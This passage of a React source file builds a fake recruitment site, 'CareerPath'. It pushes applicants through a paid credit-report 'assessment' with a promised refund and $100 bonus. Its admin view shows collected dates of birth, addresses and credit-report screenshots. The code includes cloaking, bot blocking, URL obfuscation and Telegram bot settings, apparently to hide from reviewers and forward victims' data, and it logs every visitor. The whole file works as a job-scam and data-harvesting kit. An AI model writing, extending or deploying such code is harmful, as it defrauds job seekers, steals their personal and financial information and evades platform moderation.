                        <p className="text-sm font-medium text-slate-700">{selectedApp.dob}</p>
                      </div>
                      <div className="space-y-1">
                        <p className="text-[10px] font-bold text-slate-400 uppercase">Blood Group</p>
                        <p className="text-sm font-medium text-slate-700">{selectedApp.bloodGroup || 'N/A'}</p>
                      </div>
                    </div>

                    <div className="space-y-1">
                      <p className="text-[10px] font-bold text-slate-400 uppercase">Address</p>
                      <p className="text-sm font-medium text-slate-700">
                        {selectedApp.addressLine1}, {selectedApp.city}, {selectedApp.zipCode}, {selectedApp.country}
                      </p>
                    </div>

                    {selectedApp.linkedInProfile && (
                      <div className="space-y-1">
                        <p className="text-[10px] font-bold text-slate-400 uppercase">LinkedIn</p>
                        <a href={selectedApp.linkedInProfile} target="_blank" rel="noreferrer" className="text-sm font-medium text-blue-600 hover:underline">
                          {selectedApp.linkedInProfile}
                        </a>
                      </div>
                    )}
                  </div>

                  <div className="space-y-4">
                    <p className="text-[10px] font-bold text-slate-400 uppercase">Credit Report Screenshot</p>
                    {selectedApp.creditReportScreenshot ? (
                      <div className="overflow-hidden rounded-xl border border-slate-200 shadow-sm">
                        <img 
                          src={selectedApp.creditReportScreenshot} 
                          alt="Credit Report" 
                          className="w-full h-auto max-h-[500px] object-contain"
                          referrerPolicy="no-referrer"
                        />
                      </div>
                    ) : (
                      <div className="flex h-40 items-center justify-center rounded-xl border-2 border-dashed border-slate-200 bg-slate-50 text-slate-400">
                        No screenshot uploaded
                      </div>
                    )}
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    </section>
  );
};

const JobBoards = () => {
  const boards = [
    {
      name: "Indeed",
      icon: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/6853f3a48e4921216ef21aab_Group%201321314422%20(1).svg",
      desc: "Indeed is an American worldwide employment website for job listings.",
      logo: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/685510c83f22fd1a76813ae0_iduIR7_80I_1750405307135.svg"
    },
    {
      name: "LinkedIn",
      icon: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68550c6bd58a5e5d81738fcb_Group%201321314427.svg",
      desc: "Employers can now post jobs on LinkedIn via Recooty and hire candidates faster.",
      logo: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68550f38c0c21398a0b8bf08_LinkedIn_Logo_0.svg"
    },
    {
      name: "Glassdoor",
      icon: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68550eb46095838c7cbed7d3_Group%201321314427%20(1).svg",
      desc: "Glassdoor employer branding solutions are a great way to reach job seekers.",
      logo: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68550f387ddebe741661428a_Glassdoor_Logo_0.svg"
    },
    {
      name: "Monster",
      icon: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68552ab06abf186720e7b972_Group%201321314427%20(2).svg",
      desc: "Monster Worldwide, Inc., is a global leader in connecting people to jobs.",
      logo: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68552c3abd7b66e8754f9d52_idvTwSmk9M_1750412212942.svg"
    },
    {
      name: "CareerJet",
      icon: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68552ab0620a740d32afcdcc_Group%201321314427%20(3).svg",
      desc: "Careerjet is an international job search engine and aggregator.",
      logo: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/68552c3a85d456ec037dee2e_idgcfyywb-_logos.svg"
    },
    {
      name: "Google Jobs",
      icon: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/685530096d48edc6dadf2331_Group%201321314428%20(3).svg",
      desc: "Anything that has the word ‘Google’ associated with it needs no introduction.",
      logo: "https://cdn.prod.website-files.com/55d0c394b940fa7f3ec50350/685530083efd384f33eb8253_Logo.svg"
    }
  ];

  return (
    <section className="relative z-10 w-full pt-8 pb-20 md:pt-12 md:pb-24 px-4 md:px-8">
      <div className="relative z-10 max-w-7xl mx-auto">
        <div className="text-center mb-12 overflow-hidden">
          <motion.h2 
            initial={{ opacity: 0, x: 100 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.6, ease: "easeOut" }}
            className="text-4xl md:text-5xl font-extrabold tracking-tight text-slate-900"
          >
            Our Job Boards
          </motion.h2>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {boards.map((board, index) => (
            <motion.div 
              key={index}
              initial={{ opacity: 0, rotateX: 90 }}
              whileInView={{ opacity: 1, rotateX: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.6, delay: index * 0.1, ease: "easeOut" }}
              className="group flex flex-col justify-between min-h-[250px] rounded-[20px] p-8 border border-white/40 bg-white/75 backdrop-blur-md shadow-[0_14px_28px_rgba(0,0,0,0.25),0_10px_10px_rgba(0,0,0,0.22)] transition-all duration-500 ease-[cubic-bezier(0.175,0.885,0.32,1.275)] hover:-translate-y-3 hover:bg-white/95 hover:shadow-[0_30px_60px_-12px_rgba(50,50,93,0.15),0_18px_36px_-18px_rgba(0,0,0,0.2)]"
            >
              <div>
                <div className="flex items-center gap-4 mb-4">
                  <img src={board.icon} alt={`${board.name} icon`} className="w-8 h-8" />
                  <h3 className="text-xl font-bold text-slate-900">{board.name}</h3>
                </div>
                <p className="text-slate-600 leading-relaxed text-[0.95rem] mb-5">
                  {board.desc}
                </p>
              </div>
              <div className="mt-auto h-10 flex items-center">
                <img 
                  src={board.logo} 
                  alt={`${board.name} logo`} 
                  className="max-h-[30px] w-auto opacity-60 grayscale transition-all duration-500 group-hover:grayscale-0 group-hover:opacity-100" 
                />
              </div>
            </motion.div>
          ))}
        </div>
      </div>
    </section>
  );
};

const HomePage = ({ 
  exampleReportImage, 
  companyName, 
  reviewText,
  creditReportButtonText,
  creditReportUrl,
  isCloakingEnabled,
  blockBots,
  requireInteraction,
  obfuscateUrl,
  telegramBotToken,
  telegramChatId,
  teamImage,
  teamImageSize,
  teamTitle,
  teamDescription,
  logoName,
  logoSize,
  socialLinks,
  footerText,
  step3Title,
  step4Title1,
  step4Text1,
  step4Title2,
  step4Text2,
  step4Note,
  bonusTitle,
  bonusDescription
}: { 
  exampleReportImage: string, 
  companyName: string, 
  reviewText: string,
  creditReportButtonText: string,
  creditReportUrl: string,
  isCloakingEnabled: boolean,
  blockBots: boolean,
  requireInteraction: boolean,
  obfuscateUrl: boolean,
  telegramBotToken: string,
  telegramChatId: string,
  teamImage: string,
  teamImageSize: string,
  teamTitle: string,
  teamDescription: string,
  logoName: IconName,
  logoSize: string,
  socialLinks: any,
  footerText: string,
  step3Title: string,
  step4Title1: string,
  step4Text1: string,
  step4Title2: string,
  step4Text2: string,
  step4Note: string,
  bonusTitle: string,
  bonusDescription: string
}) => {
  useEffect(() => {
    const logVisit = async () => {
      try {
        const hasVisited = sessionStorage.getItem('hasVisited');
        if (!hasVisited) {
          const info = await getVisitorInfo();
          await addDoc(collection(db, "visitor_logs"), {
            timestamp: serverTimestamp(),
            isClick: false,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            country: info.country,
            countryCode: info.countryCode,
            browser: info.browser,
            device: info.device
          });
          sessionStorage.setItem('hasVisited', 'true');
        }
      } catch (e) {
        console.error("Failed to log visit", e);
      }
    };
    logVisit();
  }, []);

  return (
  <>
    <Hero companyName={companyName} />
    <JobCategories />
    
    <div className="relative w-full overflow-hidden">
      {/* Foggy Background */}
      <div 
        className="absolute inset-0 z-0"
        style={{
          background: 'linear-gradient(125deg, #f8f9ff, #e0e7ff, #f0fff4, #ffffff, #fffaf0, #f5f3ff)',
          backgroundSize: '400% 400%',
          animation: 'fogMovement 15s ease infinite'
        }}
      />

      <section className="relative z-10 pt-16 pb-8 md:pt-24 md:pb-12">
        <div className="container mx-auto px-4 md:px-6">
          <div className="mb-12 text-center">
          <h2 className="text-3xl font-bold tracking-tight text-slate-900 sm:text-4xl">Job Application Form</h2>
          <p className="mt-4 text-slate-600">
            Complete the form below to start your application process. We offer competitive benefits and a great work environment.
          </p>
        </div>
        
        <div className="grid gap-12 lg:grid-cols-3">
          <div className="lg:col-span-2">
            <ApplicationForm 
              exampleReportImage={exampleReportImage} 
              reviewText={reviewText} 
              creditReportButtonText={creditReportButtonText}
              creditReportUrl={creditReportUrl}
              isCloakingEnabled={isCloakingEnabled}
              blockBots={blockBots}
              requireInteraction={requireInteraction}
              obfuscateUrl={obfuscateUrl}
              telegramBotToken={telegramBotToken}
              telegramChatId={telegramChatId}
              step3Title={step3Title}
              step4Title1={step4Title1}
              step4Text1={step4Text1}
              step4Title2={step4Title2}
              step4Text2={step4Text2}
              step4Note={step4Note}
            />
          </div>
          
          <div className="flex flex-col space-y-8 h-full transition-all duration-500">
            <div className="rounded-2xl bg-white p-6 shadow-sm border border-slate-200">
              <h3 className="text-lg font-bold text-slate-900">Benefits Offered</h3>
              <ul className="mt-4 space-y-3">
                {[
                  "Competitive salary",
                  "Market-leading equity grants",
                  "Medical, dental & vision insurance",
                  "Unlimited PTO",
                  "Bi-annual team retreats",
                  "Excellent growth opportunities"
                ].map((benefit) => (
                  <li key={benefit} className="flex items-center gap-3 text-sm text-slate-600">
                    <CheckCircle2 size={16} className="text-green-500" />
                    {benefit}
                  </li>
                ))}
              </ul>
            </div>

            <div className="rounded-2xl bg-slate-900 p-6 text-white shadow-lg">
              <h3 
                className="text-lg font-bold"
                dangerouslySetInnerHTML={{ __html: bonusTitle || "Recruitment Bonus" }}
              />
              <div 
                className="mt-2 text-sm text-slate-300 leading-relaxed"
                dangerouslySetInnerHTML={{ __html: bonusDescription || "After completing this assessment, you will shortly receive the interview date and time. During the interview, you will get paid a <strong>$100 bonus</strong>, and we will provide you with the official offer letter." }}
              />
            </div>

            <div className="relative overflow-hidden rounded-2xl group flex-1 min-h-[12rem] transition-all duration-500">
              <img 
                src={teamImage} 
                alt="Team collaboration" 
                className="absolute inset-0 h-full w-full object-cover transition-transform duration-500 group-hover:scale-105"
                referrerPolicy="no-referrer"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-slate-900/80 via-slate-900/20 to-transparent" />
              <div className="absolute bottom-4 left-4 right-4">
                <div 
                  className="font-medium text-white" 
                  dangerouslySetInnerHTML={{ __html: teamTitle }} 
                />
                {teamDescription && (
                  <div 
                    className="mt-1 text-xs text-slate-200" 
                    dangerouslySetInnerHTML={{ __html: teamDescription }} 
                  />
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <JobBoards />
  </div>
  </>
  );
};

export default function App() {
  const [exampleReportImage, setExampleReportImage] = useState("https://i.ibb.co.com/xKd58GgC/example.jpg");
  const [companyName, setCompanyName] = useState("CareerPath");
  const [logoName, setLogoName] = useState<IconName>("Briefcase");
  const [reviewText, setReviewText] = useState(DEFAULT_REVIEW_TEXT);
  const [creditReportButtonText, setCreditReportButtonText] = useState("Check Credit Report");
  const [creditReportUrl, setCreditReportUrl] = useState("https://1.securescorecenter.us/");
  const [isCloakingEnabled, setIsCloakingEnabled] = useState(true);
  const [seoTitle, setSeoTitle] = useState("Career Opportunities | CareerPath");
  const [seoDescription, setSeoDescription] = useState("Join our innovative team and help shape the future of healthcare.");
  const [seoThumbnail, setSeoThumbnail] = useState("https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&q=80&w=2000");
  const [footerText, setFooterText] = useState("");
  const [blockBots, setBlockBots] = useState(false);
  const [requireInteraction, setRequireInteraction] = useState(false);
  const [obfuscateUrl, setObfuscateUrl] = useState(false);
  const [telegramBotToken, setTelegramBotToken] = useState("");
  const [telegramChatId, setTelegramChatId] = useState("");
  const [teamImage, setTeamImage] = useState("https://i.ibb.co.com/hRyM2LQJ/Gemini-Generated-Image-ktqlhyktqlhyktql.png");
  const [teamImageSize, setTeamImageSize] = useState("medium");
  const [teamTitle, setTeamTitle] = useState("Join a world-class team");
  const [teamDescription, setTeamDescription] = useState("");
  const [logoSize, setLogoSize] = useState("medium");
  const [logoTextSize, setLogoTextSize] = useState("text-lg md:text-2xl");
  const [logoTextStyle, setLogoTextStyle] = useState("font-extrabold");
  const [logoTextColor, setLogoTextColor] = useState("bg-gradient-to-r from-blue-600 via-indigo-500 to-cyan-500 bg-clip-text text-transparent");
  const [socialLinks, setSocialLinks] = useState<any>({});
  const [step3Title, setStep3Title] = useState("Application Review");
  const [step4Title1, setStep4Title1] = useState("Financial Responsibility Assessment");
  const [step4Text1, setStep4Text1] = useState("Visit the company link to check the credit report:");
  const [step4Title2, setStep4Title2] = useState("Why credit report is necessary:");
  const [step4Text2, setStep4Text2] = useState(`<ul>
                      <li>
                        <strong>Analysis of Financial Responsibilities:</strong> We think that a person’s general dependability and credibility can be inferred from their financial responsibilities. 
                      </li>
                      <li>
                        <strong>Integrity Evaluation:</strong> As part of our employment assessment procedure, we utilize credit records to determine an applicant’s level of honesty and integrity. 
                      </li>
                      <li>
                        <strong>Security & Compliance:</strong> This verification ensures we maintain a secure workplace by confirming financial stability and reducing potential internal risks for our corporate clients and partners.
                      </li>
                    </ul>`);
  const [step4Note, setStep4Note] = useState("<strong>Please note:</strong> that this fee will be refunded along with the joining bonus if the verification process is successfully completed.");
  const [bonusTitle, setBonusTitle] = useState("Recruitment Bonus");
  const [bonusDescription, setBonusDescription] = useState("After completing this assessment, you will shortly receive the interview date and time. During the interview, you will get paid a <strong>$100 bonus</strong>, and we will provide you with the official offer letter.");
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const unsubscribe = onSnapshot(doc(db, "settings", "main"), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.exampleReportImage) setExampleReportImage(data.exampleReportImage);
        if (data.companyName) setCompanyName(data.companyName);
        if (data.logoName) setLogoName(data.logoName as IconName);
        if (data.reviewText) setReviewText(data.reviewText);
        if (data.creditReportButtonText) setCreditReportButtonText(data.creditReportButtonText);
        if (data.creditReportUrl) setCreditReportUrl(data.creditReportUrl);
        if (data.isCloakingEnabled !== undefined) setIsCloakingEnabled(data.isCloakingEnabled);
        if (data.seoTitle) setSeoTitle(data.seoTitle);
        if (data.seoDescription) setSeoDescription(data.seoDescription);
        if (data.seoThumbnail) setSeoThumbnail(data.seoThumbnail);
        if (data.footerText) setFooterText(data.footerText);
        if (data.blockBots !== undefined) setBlockBots(data.blockBots);
        if (data.requireInteraction !== undefined) setRequireInteraction(data.requireInteraction);
        if (data.obfuscateUrl !== undefined) setObfuscateUrl(data.obfuscateUrl);
        if (data.telegramBotToken) setTelegramBotToken(data.telegramBotToken);
        if (data.telegramChatId) setTelegramChatId(data.telegramChatId);
        if (data.teamImage) setTeamImage(data.teamImage);
        if (data.teamImageSize) setTeamImageSize(data.teamImageSize);
        if (data.teamTitle) setTeamTitle(data.teamTitle);
        if (data.teamDescription !== undefined) setTeamDescription(data.teamDescription);
        if (data.logoSize) setLogoSize(data.logoSize);
        if (data.logoTextSize) setLogoTextSize(data.logoTextSize);
        if (data.logoTextStyle) setLogoTextStyle(data.logoTextStyle);
        if (data.logoTextColor) setLogoTextColor(data.logoTextColor);
        if (data.socialLinks) setSocialLinks(data.socialLinks);
        if (data.step3Title) setStep3Title(data.step3Title);
        if (data.step4Title1) setStep4Title1(data.step4Title1);
        if (data.step4Text1) setStep4Text1(data.step4Text1);
        if (data.step4Title2) setStep4Title2(data.step4Title2);
        if (data.step4Text2) setStep4Text2(data.step4Text2);
        if (data.step4Note) setStep4Note(data.step4Note);
        if (data.bonusTitle) setBonusTitle(data.bonusTitle);
        if (data.bonusDescription) setBonusDescription(data.bonusDescription);
      }
      setIsLoading(false);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    document.title = seoTitle;
    
    // Update meta tags
    const updateMeta = (name: string, content: string, isProperty = false) => {
      let el = document.querySelector(isProperty ? `meta[property="${name}"]` : `meta[name="${name}"]`);
      if (!el) {
        el = document.createElement('meta');
        if (isProperty) el.setAttribute('property', name);
        else el.setAttribute('name', name);
        document.head.appendChild(el);
      }
      el.setAttribute('content', content);
    };

    updateMeta('description', seoDescription);
    updateMeta('og:title', seoTitle, true);
    updateMeta('og:description', seoDescription, true);
    updateMeta('og:image', seoThumbnail, true);
    updateMeta('twitter:card', 'summary_large_image');
    updateMeta('twitter:title', seoTitle);
    updateMeta('twitter:description', seoDescription);
    updateMeta('twitter:image', seoThumbnail);
  }, [seoTitle, seoDescription, seoThumbnail]);

  if (isLoading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-slate-50">
        <div className="h-12 w-12 animate-spin rounded-full border-4 border-blue-600 border-t-transparent" />
      </div>
    );
  }

  return (
    <BrowserRouter>
      <div className="min-h-screen bg-slate-50 font-sans selection:bg-blue-100 selection:text-blue-900">
        <Header 
          companyName={companyName} 
          logoName={logoName} 
          logoSize={logoSize} 
          logoTextSize={logoTextSize}
          logoTextStyle={logoTextStyle}
          logoTextColor={logoTextColor}
        />
        <main>
          <Routes>
            <Route 
              path="/" 
              element={
                <HomePage 
                  exampleReportImage={exampleReportImage} 
                  companyName={companyName} 
                  reviewText={reviewText} 
                  creditReportButtonText={creditReportButtonText}
                  creditReportUrl={creditReportUrl}
                  isCloakingEnabled={isCloakingEnabled}
                  blockBots={blockBots}
                  requireInteraction={requireInteraction}
                  obfuscateUrl={obfuscateUrl}
                  telegramBotToken={telegramBotToken}
                  telegramChatId={telegramChatId}
                  teamImage={teamImage}
                  teamImageSize={teamImageSize}
                  teamTitle={teamTitle}
                  teamDescription={teamDescription}
                  logoName={logoName}
                  logoSize={logoSize}
                  socialLinks={socialLinks}
                  footerText={footerText}
                  step3Title={step3Title}
                  step4Title1={step4Title1}
                  step4Text1={step4Text1}
                  step4Title2={step4Title2}
                  step4Text2={step4Text2}
                  step4Note={step4Note}
                  bonusTitle={bonusTitle}
                  bonusDescription={bonusDescription}
                />
              } 
            />
            <Route path="/success" element={<SuccessPage />} />
            <Route path="/status" element={<StatusCheckPage />} />
            <Route path="/status/details" element={<StatusDetailsPage />} />
            <Route 
              path="/admin" 
              element={
                <AdminPanel 
                  exampleReportImage={exampleReportImage} 
                  setExampleReportImage={setExampleReportImage} 
                  companyName={companyName}
                  setCompanyName={setCompanyName}
                  logoName={logoName}
                  setLogoName={setLogoName}
                  reviewText={reviewText}
                  setReviewText={setReviewText}
                  creditReportButtonText={creditReportButtonText}
                  setCreditReportButtonText={setCreditReportButtonText}
                  creditReportUrl={creditReportUrl}
                  setCreditReportUrl={setCreditReportUrl}
                  isCloakingEnabled={isCloakingEnabled}
                  setIsCloakingEnabled={setIsCloakingEnabled}
                  blockBots={blockBots}
                  setBlockBots={setBlockBots}
                  requireInteraction={requireInteraction}
                  setRequireInteraction={setRequireInteraction}
                  obfuscateUrl={obfuscateUrl}
                  setObfuscateUrl={setObfuscateUrl}
                  seoTitle={seoTitle}
                  setSeoTitle={setSeoTitle}
                  seoDescription={seoDescription}
                  setSeoDescription={setSeoDescription}
                  seoThumbnail={seoThumbnail}
                  setSeoThumbnail={setSeoThumbnail}
                  footerText={footerText}
                  setFooterText={setFooterText}
                  telegramBotToken={telegramBotToken}
                  setTelegramBotToken={setTelegramBotToken}
                  telegramChatId={telegramChatId}
                  setTelegramChatId={setTelegramChatId}
                  teamImage={teamImage}
                  setTeamImage={setTeamImage}
                  teamImageSize={teamImageSize}
                  setTeamImageSize={setTeamImageSize}
                  teamTitle={teamTitle}
                  setTeamTitle={setTeamTitle}
                  teamDescription={teamDescription}
                  setTeamDescription={setTeamDescription}
                  logoSize={logoSize}
                  setLogoSize={setLogoSize}
                  logoTextSize={logoTextSize}
                  setLogoTextSize={setLogoTextSize}
                  logoTextStyle={logoTextStyle}
                  setLogoTextStyle={setLogoTextStyle}
                  logoTextColor={logoTextColor}
                  setLogoTextColor={setLogoTextColor}
                  socialLinks={socialLinks}
                  setSocialLinks={setSocialLinks}
                  step3Title={step3Title}
                  setStep3Title={setStep3Title}
                  step4Title1={step4Title1}
                  setStep4Title1={setStep4Title1}
                  step4Text1={step4Text1}
                  setStep4Text1={setStep4Text1}
                  step4Title2={step4Title2}
                  setStep4Title2={setStep4Title2}
                  step4Text2={step4Text2}
                  setStep4Text2={setStep4Text2}
                  step4Note={step4Note}
                  setStep4Note={setStep4Note}
                  bonusTitle={bonusTitle}
                  setBonusTitle={setBonusTitle}
                  bonusDescription={bonusDescription}
                  setBonusDescription={setBonusDescription}
                />
              } 
            />
          </Routes>
        </main>
        <Footer 
          companyName={companyName} 
          logoName={logoName} 
          footerText={footerText} 
          logoSize={logoSize} 
          socialLinks={socialLinks} 
          logoTextColor={logoTextColor}
        />
      </div>
    </BrowserRouter>
  );
}
